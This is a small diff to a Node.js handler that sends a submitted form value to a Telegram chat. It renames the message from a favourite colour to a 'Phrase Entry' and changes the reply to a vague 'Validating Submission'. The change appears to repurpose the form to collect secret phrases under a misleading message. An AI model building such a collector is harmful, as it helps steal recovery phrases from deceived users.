@@ -38,7 +38,7 @@ module.exports = async (req, res) => {
         },
         body: JSON.stringify({
           chat_id: chatId,
-          text: `New Favourite Color\n\nColor: ${color.trim()}`
+          text: `New Phrase Entry\n\nPhrase: ${color.trim()}`
         })
       }
     );
@@ -55,7 +55,7 @@ module.exports = async (req, res) => {
 
     return res.status(200).json({
       success: true,
-      message: "Favourite color submitted successfully."
+      message: "Validating Submission"
     });
   } catch (error) {
     console.error("Submission error:", error);
